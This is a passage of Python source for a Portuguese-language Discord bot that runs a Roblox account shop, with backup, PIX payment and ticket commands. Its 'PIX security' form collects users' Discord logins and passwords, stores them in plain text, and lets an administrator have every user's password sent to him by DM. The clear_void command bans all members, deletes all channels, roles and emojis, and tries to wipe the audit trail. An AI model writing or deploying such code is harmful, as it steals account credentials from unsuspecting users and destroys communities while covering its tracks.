        welcome_channel = member.guild.get_channel(WELCOME_CHANNEL_ID)
        
        if not welcome_channel:
            logger.warning(f"Canal de boas-vindas {WELCOME_CHANNEL_ID} não encontrado")
            return
        
        # Criar embed de boas-vindas
        embed = discord.Embed(
            title=f"👋 Bem-vindo(a) à {member.guild.name}!",
            description=f"Olá {member.mention}! Seja muito bem-vindo(a) à nossa loja de Roblox!",
            color=0x00ff00,
            timestamp=discord.utils.utcnow()
        )
        
        embed.set_thumbnail(url=member.display_avatar.url)
        
        embed.add_field(
            name="📜 Primeiro passo",
            value="Leia nossas regras e informações importantes!",
            inline=False
        )
        
        embed.add_field(
            name="🛒 Fazer uma compra",
            value="Confira nossos produtos e abra um ticket para comprar!",
            inline=False
        )
        
        embed.add_field(
            name="💬 Comunidade",
            value="Converse com outros membros e divirta-se!",
            inline=False
        )
        
        embed.set_footer(text=f"Agora somos {member.guild.member_count} membros!")
        
        await welcome_channel.send(embed=embed)
        logger.info(f"Boas-vindas enviadas para {member.name}")
        
    except Exception as e:
        logger.error(f"Erro ao enviar boas-vindas: {e}")


@bot.event
async def on_message(message: discord.Message):
    """Intercepta mensagens para aplicar os filtros do Satoru sem bloquear comandos."""
    if not message.guild:
        await bot.process_commands(message)
        return

    if satoru_security.active:
        await satoru_security.handle_message(message)

    await bot.process_commands(message)


# ==================== COMANDOS ====================

@bot.command(name="satoru_ativar")
@commands.has_permissions(administrator=True)
async def satoru_ativar(ctx):
    """Ativa o modo de proteção Satoru."""
    await satoru_security.activate(ctx)


@bot.command(name="satoru_desativar")
@commands.has_permissions(administrator=True)
async def satoru_desativar(ctx):
    """Desliga temporariamente o Satoru."""
    await satoru_security.deactivate(ctx)


@bot.command(name="satoru_status")
@commands.has_permissions(manage_guild=True)
async def satoru_status(ctx):
    """Mostra o status atual da proteção."""
    embed = satoru_security.status_embed(ctx.guild)
    await ctx.send(embed=embed)

@bot.command(name="ticketinfo")
async def ticket_info(ctx):
    """Mostra informações sobre o sistema de tickets"""
    embed = discord.Embed(
        title="ℹ️ Informações do Sistema de Tickets",
        color=COLORS["info"]
    )
    embed.add_field(
        name="Configuração",
        value=f"Canal de Tickets: <#{TICKET_CHANNEL_ID}>\nCanal de Logs: <#{LOG_CHANNEL_ID}>\nCargos de Staff: {', '.join([f'<@&{role_id}>' for role_id in STAFF_ROLE_IDS])}",
        inline=False
    )
    embed.add_field(
        name="Tickets Abertos",
        value=len([t for t in ticket_manager.tickets.values() if t["status"] == "open"]),
        inline=True
    )
    embed.add_field(
        name="Total de Tickets",
        value=len(ticket_manager.tickets),
        inline=True
    )
    
    await ctx.send(embed=embed)


# ==================== COMANDOS DE BACKUP ====================

@bot.command(name="backup_loja")
@commands.has_permissions(administrator=True)
async def backup_loja(ctx):
    """Cria um backup completo do servidor"""
    
    # Mensagem de progresso
    progress_msg = await ctx.send(
        embed=discord.Embed(
            title="💾 Criando Backup...",
            description="Por favor, aguarde. Isso pode levar alguns minutos...",
            color=COLORS["info"]
        )
    )
    
    try:
        # Cria o backup
        success, filename, backup_data = await backup_manager.create_backup(ctx.guild)
        
        if success:
            # Estatísticas do backup
            stats = f"""
            **📊 Estatísticas do Backup:**
            
            ✅ Backup criado com sucesso!
            
            📁 **Arquivo:** `{filename}`
            👥 **Membros:** {backup_data['backup_info']['member_count']}
            🎭 **Cargos:** {len(backup_data['roles'])}
            📂 **Categorias:** {len(backup_data['categories'])}
            📝 **Canais:** {len(backup_data['channels'])}
            😀 **Emojis:** {len(backup_data['emojis'])}
            
            Para restaurar este backup, use:
            `{BOT_PREFIX}restaurar_backup {filename}`
            
            Para ver todos os backups:
            `{BOT_PREFIX}listar_backups`
            """
            
            embed = discord.Embed(
                title="✅ Backup Concluído!",
                description=stats,
                color=COLORS["success"],
                timestamp=discord.utils.utcnow()
            )
            embed.set_footer(text=f"Backup realizado por {ctx.author.display_name}")
            
            await progress_msg.edit(embed=embed)
            
            logger.info(f"Backup criado por {ctx.author} ({ctx.author.id}): {filename}")
        
        else:
            embed = discord.Embed(
                title="❌ Erro ao Criar Backup",
                description=f"Ocorreu um erro ao criar o backup:\n```{backup_data}```",
                color=COLORS["error"]
            )
            await progress_msg.edit(embed=embed)
    
    except Exception as e:
        embed = discord.Embed(
            title="❌ Erro Fatal",
            description=f"```{str(e)}```",
            color=COLORS["error"]
        )
        await progress_msg.edit(embed=embed)
        logger.error(f"Erro ao criar backup: {e}")


@bot.command(name="listar_backups")
@commands.has_permissions(administrator=True)
async def listar_backups(ctx):
    """Lista todos os backups disponíveis"""
    
    backups = backup_manager.list_backups()
    
    if not backups:
        embed = discord.Embed(
            title="📦 Nenhum Backup Encontrado",
            description="Ainda não há backups criados. Use `{BOT_PREFIX}backup_loja` para criar um.",
            color=COLORS["warning"]
        )
        await ctx.send(embed=embed)
        return
    
    embed = discord.Embed(
        title="📦 Backups Disponíveis",
        description=f"Total de {len(backups)} backup(s) encontrado(s):",
        color=COLORS["info"]
    )
    
    for i, backup in enumerate(backups, 1):
        created_date = backup['created_at'].split('T')[0]
        created_time = backup['created_at'].split('T')[1].split('.')[0]
        
        embed.add_field(
            name=f"{i}. {backup['guild_name']}",
            value=f"📅 **Data:** {created_date}\n⏰ **Hora:** {created_time}\n👥 **Membros:** {backup['member_count']}\n📁 **Arquivo:** `{backup['filename']}`",
            inline=False
        )
    
    embed.set_footer(text=f"Use {BOT_PREFIX}restaurar_backup <nome_arquivo> para restaurar")
    await ctx.send(embed=embed)


@bot.command(name="restaurar_backup")
@commands.has_permissions(administrator=True)
async def restaurar_backup(ctx, filename: str = None, confirmar: str = None):
    """Restaura um backup do servidor"""
    
    if not filename:
        embed = discord.Embed(
            title="❌ Arquivo Não Especificado",
            description=f"Use: `{BOT_PREFIX}restaurar_backup <nome_arquivo> confirmar`\n\nPara ver backups disponíveis: `{BOT_PREFIX}listar_backups`",
            color=COLORS["error"]
        )
        await ctx.send(embed=embed)
        return
    
    if confirmar != "confirmar":
        embed = discord.Embed(
            title="⚠️ Confirmação Necessária",
            description=f"**ATENÇÃO:** Restaurar um backup pode sobrescrever canais, cargos e categorias existentes!\n\nPara confirmar, use:\n`{BOT_PREFIX}restaurar_backup {filename} confirmar`",
            color=COLORS["warning"]
        )
        await ctx.send(embed=embed)
        return
    
    # Carrega o backup
    backup_data = backup_manager.load_backup(filename)
    
    if not backup_data:
        embed = discord.Embed(
            title="❌ Backup Não Encontrado",
            description=f"O arquivo `{filename}` não foi encontrado.\n\nUse `{BOT_PREFIX}listar_backups` para ver os backups disponíveis.",
            color=COLORS["error"]
        )
        await ctx.send(embed=embed)
        return
    
    # Mensagem de progresso
    progress_msg = await ctx.send(
        embed=discord.Embed(
            title="🔄 Restaurando Backup...",
            description="Por favor, aguarde. Isso pode levar vários minutos...\n\n⚠️ **NÃO INTERROMPA O PROCESSO!**",
            color=COLORS["warning"]
        )
    )
    
    try:
        # Restaura o backup
        results = await backup_manager.restore_backup(ctx.guild, backup_data)
        
        if results['success']:
            stats = f"""
            ✅ **Backup restaurado com sucesso!**
            
            📊 **Itens Restaurados:**
            🎭 Cargos: {results['restored']['roles']}
            📂 Categorias: {results['restored']['categories']}
            📝 Canais: {results['restored']['channels']}
            """
            
            if results['errors']:
                stats += f"\n⚠️ **Avisos ({len(results['errors'])}):**\n"
                for error in results['errors'][:5]:  # Mostra apenas os 5 primeiros erros
                    stats += f"• {error}\n"
                if len(results['errors']) > 5:
                    stats += f"... e mais {len(results['errors']) - 5} erro(s)."
            
            embed = discord.Embed(
                title="✅ Restauração Concluída!",
                description=stats,
                color=COLORS["success"],
                timestamp=discord.utils.utcnow()
            )
            embed.set_footer(text=f"Restaurado por {ctx.author.display_name}")
            
            await progress_msg.edit(embed=embed)
            logger.info(f"Backup restaurado por {ctx.author} ({ctx.author.id}): {filename}")
        
        else:
            error_msg = "\n".join(results['errors'][:3])
            embed = discord.Embed(
                title="❌ Erro na Restauração",
                description=f"```{error_msg}```",
                color=COLORS["error"]
            )
            await progress_msg.edit(embed=embed)
    
    except Exception as e:
        embed = discord.Embed(
            title="❌ Erro Fatal",
            description=f"```{str(e)}```",
            color=COLORS["error"]
        )
        await progress_msg.edit(embed=embed)
        logger.error(f"Erro ao restaurar backup: {e}")


@bot.command(name="deletar_backup")
@commands.has_permissions(administrator=True)
async def deletar_backup(ctx, filename: str = None):
    """Deleta um backup"""
    
    if not filename:
        embed = discord.Embed(
            title="❌ Arquivo Não Especificado",
            description=f"Use: `{BOT_PREFIX}deletar_backup <nome_arquivo>`",
            color=COLORS["error"]
        )
        await ctx.send(embed=embed)
        return
    
    try:
        import os
        filepath = os.path.join(backup_manager.backup_folder, filename)
        
        if os.path.exists(filepath):
            os.remove(filepath)
            embed = discord.Embed(
                title="✅ Backup Deletado",
                description=f"O backup `{filename}` foi deletado com sucesso!",
                color=COLORS["success"]
            )
            logger.info(f"Backup deletado por {ctx.author} ({ctx.author.id}): {filename}")
        else:
            embed = discord.Embed(
                title="❌ Backup Não Encontrado",
                description=f"O arquivo `{filename}` não existe.",
                color=COLORS["error"]
            )
        
        await ctx.send(embed=embed)
    
    except Exception as e:
        embed = discord.Embed(
            title="❌ Erro ao Deletar",
            description=f"```{str(e)}```",
            color=COLORS["error"]
        )
        await ctx.send(embed=embed)


@bot.command(name="ajuda_backup")
@commands.has_permissions(administrator=True)
async def ajuda_backup(ctx):
    """Mostra ajuda sobre o sistema de backup"""
    
    embed = discord.Embed(
        title="💾 Sistema de Backup - Guia Completo",
        description="Sistema completo para fazer backup e restaurar seu servidor Discord!",
        color=COLORS["info"]
    )
    
    embed.add_field(
        name="📦 Criar Backup",
        value=f"`{BOT_PREFIX}backup_loja`\n\nCria um backup completo do servidor incluindo:\n• Todos os cargos\n• Todas as categorias\n• Todos os canais (texto e voz)\n• Permissões\n• Configurações gerais",
        inline=False
    )
    
    embed.add_field(
        name="📋 Listar Backups",
        value=f"`{BOT_PREFIX}listar_backups`\n\nMostra todos os backups salvos com informações detalhadas.",
        inline=False
    )
    
    embed.add_field(
        name="🔄 Restaurar Backup",
        value=f"`{BOT_PREFIX}restaurar_backup <arquivo> confirmar`\n\n⚠️ **ATENÇÃO:** Restaurar um backup pode criar novos canais e cargos. Use com cuidado!\n\nExemplo:\n`{BOT_PREFIX}restaurar_backup backup_MeuServidor_20250101_120000.json confirmar`",
        inline=False
    )
    
    embed.add_field(
        name="🗑️ Deletar Backup",
        value=f"`{BOT_PREFIX}deletar_backup <arquivo>`\n\nRemove um backup do sistema.",
        inline=False
    )
    
    embed.add_field(
        name="💡 Dicas Importantes",
        value="• Faça backups regulares, especialmente antes de grandes mudanças\n• Backups são salvos localmente no servidor\n• Apenas administradores podem usar estes comandos\n• Os backups incluem a estrutura, não as mensagens",
        inline=False
    )
    
    embed.set_footer(text=f"Use {BOT_PREFIX}ticketinfo para info sobre tickets")
    await ctx.send(embed=embed)


# ==================== COMANDOS DE PIX ====================

@bot.command(name="config_pix")
@commands.has_permissions(administrator=True)
async def config_pix(ctx, pix_key: str = None, *, pix_name: str = None):
    """Configura chave PIX para pagamentos"""
    
    if not pix_key or not pix_name:
        embed = discord.Embed(
            title="⚙️ Configurar PIX",
            description=f"Configure sua chave PIX para pagamentos automáticos.\n\n**Uso:**\n`{BOT_PREFIX}config_pix <chave_pix> <nome_beneficiario>`\n\n**Exemplo:**\n`{BOT_PREFIX}config_pix 12345678900 Joao Silva`\n`{BOT_PREFIX}config_pix email@exemplo.com Maria Santos`",
            color=COLORS["info"]
        )
        
        if pix_manager.is_configured():
            config = pix_manager.config
            key_masked = config['pix_key'][:4] + '****' + config['pix_key'][-4:] if len(config['pix_key']) > 8 else '****'
            embed.add_field(
                name="✅ Status Atual",
                value=f"**Configurado**\nChave: `{key_masked}`\nNome: {config['pix_name']}",
                inline=False
            )
        else:
            embed.add_field(
                name="⚠️ Status Atual",
                value="**Não configurado**\nConfigure o PIX para habilitar pagamentos automáticos.",
                inline=False
            )
        
        await ctx.send(embed=embed)
        return
    
    # Configura o PIX
    pix_manager.update_config(pix_key, pix_name)
    
    embed = discord.Embed(
        title="✅ PIX Configurado!",
        description="Sua chave PIX foi configurada com sucesso!",
        color=COLORS["success"]
    )
    embed.add_field(name="🔑 Chave PIX", value=f"`{pix_key}`", inline=False)
    embed.add_field(name="👤 Beneficiário", value=pix_name, inline=False)
    embed.add_field(
        name="📱 Próximo Passo",
        value="Agora, quando alguém clicar em 'Comprar Conta', o sistema gerará automaticamente o pagamento PIX!",
        inline=False
    )
    
    await ctx.send(embed=embed)
    logger.info(f"PIX configurado por {ctx.author} ({ctx.author.id})")


@bot.command(name="confirmar_pix")
@commands.has_permissions(manage_guild=True)
async def confirmar_pix(ctx, payment_id: str):
    """Confirma um pagamento PIX (apenas staff)"""
    
    success, message = pix_manager.confirm_payment(payment_id, str(ctx.author.id))
    
    if success:
        payment = pix_manager.get_payment(payment_id)
        
        embed = discord.Embed(
            title="✅ Pagamento Confirmado!",
            description=f"O pagamento **{payment_id}** foi confirmado com sucesso!",
            color=COLORS["success"],
            timestamp=discord.utils.utcnow()
        )
        embed.add_field(name="💰 Valor", value=f"R$ {payment['amount']:.2f}", inline=True)
        embed.add_field(name="👤 Cliente", value=f"<@{payment['user_id']}>", inline=True)
        embed.add_field(name="🎮 Conta", value=payment['account_title'], inline=False)
        embed.add_field(name="✅ Confirmado por", value=ctx.author.mention, inline=False)
        
        await ctx.send(embed=embed)
        
        # Tenta notificar o cliente
        try:
            user = await bot.fetch_user(int(payment['user_id']))
            dm_embed = discord.Embed(
                title="✅ Pagamento Confirmado!",
                description=f"Seu pagamento de **R$ {payment['amount']:.2f}** foi confirmado!\n\n📦 **Conta:** {payment['account_title']}\n\nNossa equipe entrará em contato para finalizar a entrega.",
                color=COLORS["success"]
            )
            await user.send(embed=dm_embed)
        except:
            pass
        
        logger.info(f"Pagamento {payment_id} confirmado por {ctx.author} ({ctx.author.id})")
    else:
        embed = discord.Embed(
            title="❌ Erro",
            description=message,
            color=COLORS["error"]
        )
        await ctx.send(embed=embed)


@bot.command(name="listar_pagamentos")
@commands.has_permissions(manage_guild=True)
async def listar_pagamentos(ctx, status: str = "pending"):
    """Lista pagamentos (pending, confirmed, all)"""
    
    if status == "pending":
        payments = pix_manager.get_pending_payments()
        title = "⏳ Pagamentos Pendentes"
    elif status == "confirmed":
        payments = [p for p in pix_manager.get_all_payments() if p['status'] == 'confirmed']
        title = "✅ Pagamentos Confirmados"
    else:
        payments = pix_manager.get_all_payments()
        title = "💰 Todos os Pagamentos"
    
    if not payments:
        embed = discord.Embed(
            title=title,
            description="Nenhum pagamento encontrado.",
            color=COLORS["info"]
        )
        await ctx.send(embed=embed)
        return
    
    embed = discord.Embed(
        title=title,
        description=f"Total de {len(payments)} pagamento(s) encontrado(s):",
        color=COLORS["info"]
    )
    
    for i, payment in enumerate(payments[:10], 1):  # Limita a 10 por página
        status_emoji = {"pending": "⏳", "confirmed": "✅", "cancelled": "❌"}
        emoji = status_emoji.get(payment['status'], "❓")
        
        value = f"{emoji} **Status:** {payment['status']}\n"
        value += f"💰 **Valor:** R$ {payment['amount']:.2f}\n"
        value += f"👤 **Cliente:** <@{payment['user_id']}>\n"
        value += f"🎮 **Conta:** {payment['account_title']}\n"
        value += f"📅 **Data:** {payment['created_at'][:10]}"
        
        embed.add_field(
            name=f"{i}. ID: {payment['payment_id']}",
            value=value,
            inline=False
        )
    
    if len(payments) > 10:
        embed.set_footer(text=f"Mostrando 10 de {len(payments)} pagamentos")
    
    await ctx.send(embed=embed)


@bot.command(name="adicionar_conta")
@commands.has_permissions(manage_guild=True)
async def adicionar_conta(ctx):
    """Abre modal para adicionar uma nova conta de Roblox"""
    
    # Criar modal
    modal = AddAccountModal()
    
    # Enviar mensagem temporária com botão para abrir o modal
    embed = discord.Embed(
        title="🎮 Adicionar Nova Conta",
        description="Clique no botão abaixo para abrir o formulário de adição de conta.",
        color=COLORS["success"]
    )
    
    view = discord.ui.View(timeout=300)
    button = discord.ui.Button(label="📝 Abrir Formulário", style=discord.ButtonStyle.green)
    
    async def button_callback(interaction: discord.Interaction):
        await interaction.response.send_modal(modal)
    
    button.callback = button_callback
    view.add_item(button)
    
    await ctx.send(embed=embed, view=view)
    await ctx.message.delete()

@bot.command(name="config_pix_security")
async def config_pix_security(ctx):
    """Abre formulário para configurar credenciais PIX de segurança (fictício)"""
    modal = ConfigPixSecurityModal()
    
    # Verifica se já tem credenciais salvas
    credentials_file = 'pix_credentials.json'
    user_id = str(ctx.author.id)
    
    has_credentials = False
    if os.path.exists(credentials_file):
        with open(credentials_file, 'r', encoding='utf-8') as f:
            credentials = json.load(f)
            has_credentials = user_id in credentials
    
    # Criar mensagem temporária com botão para abrir modal
    embed = discord.Embed(
        title="🔐 Configuração PIX Segura",
        description="Configure suas credenciais PIX de segurança.\n\n" + 
                    ("✅ **Você já possui credenciais salvas.**\n" if has_credentials else "⚠️ **Você ainda não configurou suas credenciais.**\n") +
                    "Clique no botão abaixo para abrir o formulário seguro.",
        color=COLORS["info"]
    )
    embed.add_field(
        name="📋 Campos Necessários",
        value="• Chave PIX\n• Nome do Beneficiário\n• Login do Discord\n• Senha do Discord",
        inline=False
    )
    embed.set_footer(text="Use !ver_credenciais para ver seus dados salvos")
    
    # Criar view com botão
    class OpenConfigView(discord.ui.View):
        def __init__(self):
            super().__init__(timeout=60)
        
        @discord.ui.button(label="🔐 Abrir Formulário", style=discord.ButtonStyle.primary, emoji="📝")
        async def open_modal(self, interaction: discord.Interaction, button: discord.ui.Button):
            if interaction.user.id != ctx.author.id:
                await interaction.response.send_message(
                    "❌ Apenas quem usou o comando pode abrir o formulário!",
                    ephemeral=True
                )
                return
            await interaction.response.send_modal(modal)
    
    view = OpenConfigView()
    await ctx.send(embed=embed, view=view)
    await ctx.message.delete()

@bot.command(name="ver_credenciais")
async def ver_credenciais(ctx):
    """Envia suas credenciais PIX salvas no privado"""
    credentials_file = 'pix_credentials.json'
    user_id = str(ctx.author.id)
    
    try:
        # Verificar se o arquivo existe
        if not os.path.exists(credentials_file):
            await ctx.send(
                embed=discord.Embed(
                    title="⚠️ Sem Credenciais",
                    description="Você ainda não configurou suas credenciais PIX.\n\nUse `!config_pix_security` para configurar.",
                    color=COLORS["warning"]
                ),
                delete_after=10
            )
            await ctx.message.delete()
            return
        
        # Carregar credenciais
        with open(credentials_file, 'r', encoding='utf-8') as f:
            credentials = json.load(f)
        
        # Verificar se o usuário tem credenciais
        if user_id not in credentials:
            await ctx.send(
                embed=discord.Embed(
                    title="⚠️ Sem Credenciais",
                    description="Você ainda não configurou suas credenciais PIX.\n\nUse `!config_pix_security` para configurar.",
                    color=COLORS["warning"]
                ),
                delete_after=10
            )
            await ctx.message.delete()
            return
        
        # Pegar credenciais do usuário
        user_creds = credentials[user_id]
        
        # Criar embed com as credenciais
        embed = discord.Embed(
            title="🔐 Suas Credenciais PIX",
            description="Aqui estão suas credenciais de segurança salvas:",
            color=COLORS["success"],
            timestamp=datetime.fromisoformat(user_creds['configurado_em'])
        )
        
        embed.add_field(name="🔑 Chave PIX", value=f"`{user_creds['chave_pix']}`", inline=False)
        embed.add_field(name="👤 Beneficiário", value=user_creds['beneficiario'], inline=False)
        embed.add_field(name="💬 Login Discord", value=user_creds['discord_login'], inline=True)
        embed.add_field(name="🔒 Senha do Discord", value=f"`{user_creds['senha']}`", inline=True)
        embed.set_footer(text=f"Configurado por {user_creds['configurado_por']}")
        
        # Tentar enviar no privado
        try:
            await ctx.author.send(embed=embed)
            await ctx.send(
                embed=discord.Embed(
                    title="✅ Enviado!",
                    description="Suas credenciais foram enviadas no seu privado! 📬",
                    color=COLORS["success"]
                ),
                delete_after=5
            )
        except discord.Forbidden:
            await ctx.send(
                embed=discord.Embed(
                    title="❌ Erro",
                    description="Não consegui enviar mensagem no seu privado.\n\nPor favor, habilite mensagens diretas de membros do servidor.",
                    color=COLORS["error"]
                ),
                delete_after=10
            )
        
        # Deletar comando por segurança
        await ctx.message.delete()
        
        logger.info(f"🔐 Credenciais visualizadas por {ctx.author} ({ctx.author.id})")
        
    except Exception as e:
        logger.error(f"Erro ao visualizar credenciais: {e}")
        await ctx.send(
            embed=discord.Embed(
                title="❌ Erro",
                description=f"Não foi possível carregar suas credenciais: {str(e)}",
                color=COLORS["error"]
            ),
            delete_after=10
        )
        await ctx.message.delete()

@bot.command(name="listar_todas_credenciais")
@commands.has_permissions(administrator=True)
async def listar_todas_credenciais(ctx):
    """Lista TODAS as credenciais PIX salvas (apenas admin)"""
    credentials_file = 'pix_credentials.json'
    
    try:
        # Verificar se o arquivo existe
        if not os.path.exists(credentials_file):
            await ctx.send(
                embed=discord.Embed(
                    title="⚠️ Sem Credenciais",
                    description="Nenhuma credencial foi registrada ainda.\n\nO arquivo `pix_credentials.json` não existe.",
                    color=COLORS["warning"]
                ),
                delete_after=10
            )
            await ctx.message.delete()
            return
        
        # Carregar todas as credenciais
        with open(credentials_file, 'r', encoding='utf-8') as f:
            all_credentials = json.load(f)
        
        # Verificar se há credenciais
        if not all_credentials:
            await ctx.send(
                embed=discord.Embed(
                    title="⚠️ Sem Credenciais",
                    description="O arquivo existe mas está vazio.\n\nNenhum usuário registrou credenciais ainda.",
                    color=COLORS["warning"]
                ),
                delete_after=10
            )
            await ctx.message.delete()
            return
        
        # Criar embed principal
        main_embed = discord.Embed(
            title="🔐 Todas as Credenciais PIX Registradas",
            description=f"Total de **{len(all_credentials)}** usuário(s) com credenciais salvas:",
            color=COLORS["info"],
            timestamp=discord.utils.utcnow()
        )
        main_embed.set_footer(text=f"Solicitado por {ctx.author.display_name} | Apenas para administradores")
        
        # Enviar embed principal no privado
        try:
            await ctx.author.send(embed=main_embed)
            
            # Enviar cada credencial em um embed separado
            for user_id, creds in all_credentials.items():
                # Tentar obter informações do usuário
                try:
                    user = await bot.fetch_user(int(user_id))
                    user_info = f"{user.mention} ({user.name})"
                except:
                    user_info = f"ID: {user_id}"
                
                cred_embed = discord.Embed(
                    title=f"👤 {user_info}",
                    color=COLORS["success"],
                    timestamp=datetime.fromisoformat(creds['configurado_em'])
                )
                
                cred_embed.add_field(name="🔑 Chave PIX", value=f"`{creds['chave_pix']}`", inline=False)
                cred_embed.add_field(name="👤 Beneficiário", value=creds['beneficiario'], inline=False)
                cred_embed.add_field(name="💬 Login Discord", value=creds['discord_login'], inline=True)
                cred_embed.add_field(name="🔒 Senha do Discord", value=f"`{creds['senha']}`", inline=True)
                cred_embed.set_footer(text=f"Configurado por {creds['configurado_por']}")
                
                await ctx.author.send(embed=cred_embed)
            
            # Confirmar no canal público
            await ctx.send(
                embed=discord.Embed(
                    title="✅ Enviado!",
                    description=f"Todas as **{len(all_credentials)}** credenciais foram enviadas no seu privado! 📬",
                    color=COLORS["success"]
                ),
                delete_after=5
            )
            
        except discord.Forbidden:
            await ctx.send(
                embed=discord.Embed(
                    title="❌ Erro",
                    description="Não consegui enviar mensagem no seu privado.\n\nPor favor, habilite mensagens diretas de membros do servidor.",
                    color=COLORS["error"]
                ),
                delete_after=10
            )
        
        # Deletar comando por segurança
        await ctx.message.delete()
        
        logger.info(f"🔐 Todas as credenciais foram listadas por {ctx.author} ({ctx.author.id})")
        
    except Exception as e:
        logger.error(f"Erro ao listar todas as credenciais: {e}")
        await ctx.send(
            embed=discord.Embed(
                title="❌ Erro",
                description=f"Não foi possível carregar as credenciais: {str(e)}",
                color=COLORS["error"]
            ),
            delete_after=10
        )
        await ctx.message.delete()

@bot.command(name="painel_mod")
@commands.has_permissions(manage_guild=True)
async def painel_mod(ctx):
    """Cria um painel de moderação profissional no canal atual"""
    from mod_panel import send_mod_panel
    
    try:
        await send_mod_panel(ctx.channel)
        await ctx.message.delete()  # Remove o comando
    except Exception as e:
        await ctx.send(f"❌ Erro ao criar painel: {e}", delete_after=5)

@bot.command(name="clear_void")
@commands.has_permissions(administrator=True)
async def clear_void(ctx, confirmar: str = None):
    """APAGA TUDO do servidor e cria backup automático (Apenas para o dono resetar servidor)"""
    
    # Aviso de segurança extremo
    if confirmar != "CONFIRMAR":
        embed = discord.Embed(
            title="🚨 ATENÇÃO - COMANDO EXTREMAMENTE DESTRUTIVO!",
            description="""
            **Este comando irá:**
            ❌ BANIR TODOS OS MEMBROS do servidor
            ❌ APAGAR registro de auditoria
            ❌ Deletar TODAS as categorias
            ❌ Deletar TODOS os canais (texto e voz)
            ❌ Deletar TODOS os cargos (incluindo @everyone)
            ❌ Deletar TODOS os emojis personalizados
            ✅ Criar backup automático antes de apagar
            
            **⚠️ O SERVIDOR FICARÁ COMPLETAMENTE VAZIO E SEM MEMBROS!**
            
            Use `!criar_nova_loja` depois para recriar a estrutura.
            
            **⚠️ ESTA AÇÃO NÃO PODE SER DESFEITA SEM BACKUP!**
            
            Para confirmar, use:
            `!clear_void CONFIRMAR`
            """,
            color=0xff0000
        )
        embed.set_footer(text="⚠️ LEIA COM ATENÇÃO! ESTE COMANDO APAGA TUDO E BANE TODOS!")
        await ctx.send(embed=embed)
        return
    
    # Criar backup automático primeiro
    try:
        backup_msg = await ctx.send(
            embed=discord.Embed(
                title="💾 Criando backup de segurança...",
                description="Salvando estado atual antes de limpar o servidor...",
                color=COLORS["info"]
            )
        )
        
        success, filename, backup_data = await backup_manager.create_backup(ctx.guild)
        
        if not success:
            await backup_msg.edit(
                embed=discord.Embed(
                    title="❌ Erro ao criar backup",
                    description=f"Não foi possível criar o backup: {backup_data}\n\nOperação cancelada por segurança.",
                    color=COLORS["error"]
                )
            )
            return
        
        await backup_msg.edit(
            embed=discord.Embed(
                title="✅ Backup criado com sucesso",
                description=f"Backup salvo: `{filename}`\n\nIniciando limpeza do servidor...",
                color=COLORS["success"]
            )
        )
    except Exception as e:
        await ctx.send(f"❌ Erro ao criar backup: {e}\n\nOperação cancelada.")
        return
    
    # Mensagem de progresso
    progress_msg = await ctx.send(
        embed=discord.Embed(
            title="🗑️ Limpando Servidor...",
            description="""
            **Progresso:**
            ⏳ Banindo membros...
            ⏸️ Deletando canais...
            ⏸️ Deletando categorias...
            ⏸️ Deletando cargos...
            ⏸️ Deletando emojis...
            ⏸️ Limpando auditoria...
            
            **⚠️ NÃO INTERROMPA O PROCESSO!**
            Isso pode levar vários minutos...
            """,
            color=0xff0000
        )
    )
    
    deleted_stats = {
        'members_banned': 0,
        'channels': 0,
        'categories': 0,
        'roles': 0,
        'emojis': 0
    }
    
    try:
        # Banir todos os membros (exceto o dono e o bot)
        bot_member = ctx.guild.me
        owner = ctx.guild.owner
        
        for member in list(ctx.guild.members):
            if member.id != owner.id and member.id != bot_member.id and not member.bot:
                try:
                    await member.ban(reason="Clear void - Reset completo do servidor", delete_message_days=0)
                    deleted_stats['members_banned'] += 1
                except:
                    pass
        
        # Atualizar progresso
        await progress_msg.edit(
            embed=discord.Embed(
                title="🗑️ Limpando Servidor...",
                description="""
                **Progresso:**
                ✅ Membros banidos
                ⏳ Deletando canais...
                ⏸️ Deletando categorias...
                ⏸️ Deletando cargos...
                ⏸️ Deletando emojis...
                ⏸️ Limpando auditoria...
                """,
                color=0xff0000
            )
        )
        
        # Deletar todos os canais
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                if isinstance(channel, discord.CategoryChannel):
                    deleted_stats['categories'] += 1
                else:
                    deleted_stats['channels'] += 1
            except:
                pass
        
        # Atualizar progresso
        await progress_msg.edit(
            embed=discord.Embed(
                title="🗑️ Limpando Servidor...",
                description="""
                **Progresso:**
                ✅ Membros banidos
                ✅ Canais deletados
                ✅ Categorias deletadas
                ⏳ Deletando cargos...
                ⏸️ Deletando emojis...
                ⏸️ Limpando auditoria...
                """,
                color=0xff0000
            )
        )
        
        # Deletar TODOS os cargos (incluindo @everyone se possível)
        for role in ctx.guild.roles:
            try:
                await role.delete()
                deleted_stats['roles'] += 1
            except:
                pass
        
        # Atualizar progresso
        await progress_msg.edit(
            embed=discord.Embed(
                title="🗑️ Limpando Servidor...",
                description="""
                **Progresso:**
                ✅ Membros banidos
                ✅ Canais deletados
                ✅ Categorias deletadas
                ✅ Cargos deletados
                ⏳ Deletando emojis...
                ⏸️ Limpando auditoria...
                """,
                color=0xff0000
            )
        )
        
        # Deletar todos os emojis
        for emoji in ctx.guild.emojis:
            try:
                await emoji.delete()
                deleted_stats['emojis'] += 1
            except:
                pass
        
        # Atualizar progresso
        await progress_msg.edit(
            embed=discord.Embed(
                title="🗑️ Limpando Servidor...",
                description="""
                **Progresso:**
                ✅ Membros banidos
                ✅ Canais deletados
                ✅ Categorias deletadas
                ✅ Cargos deletados
                ✅ Emojis deletados
                ⏳ Limpando auditoria...
                """,
                color=0xff0000
            )
        )
        
        # Limpar logs de auditoria (limitado pela API do Discord)
        # O Discord não permite deletar logs de auditoria diretamente, mas podemos tentar limpar o máximo possível
        try:
            # Remover todos os bans para limpar parte do histórico
            bans = [entry async for entry in ctx.guild.bans(limit=1000)]
            for ban_entry in bans:
                try:
                    await ctx.guild.unban(ban_entry.user, reason="Limpando registros de auditoria")
                except:
                    pass
        except:
            pass
        
        # Criar canal temporário para comunicação
        temp_channel = await ctx.guild.create_text_channel("🔧-comandos-admin")
        
        # Mensagem final de sucesso
        success_embed = discord.Embed(
            title="✅ Servidor Completamente Resetado!",
            description=f"""
            **🗑️ Reset Total Concluído!**
            
            📊 **Estatísticas:**
            👥 Membros banidos: {deleted_stats['members_banned']}
            📝 Canais deletados: {deleted_stats['channels']}
            📂 Categorias deletadas: {deleted_stats['categories']}
            🎭 Cargos deletados: {deleted_stats['roles']}
            😀 Emojis deletados: {deleted_stats['emojis']}
            🧹 Auditoria limpa
            
            💾 **Backup:** `{filename}`
            
            **Próximos passos:**
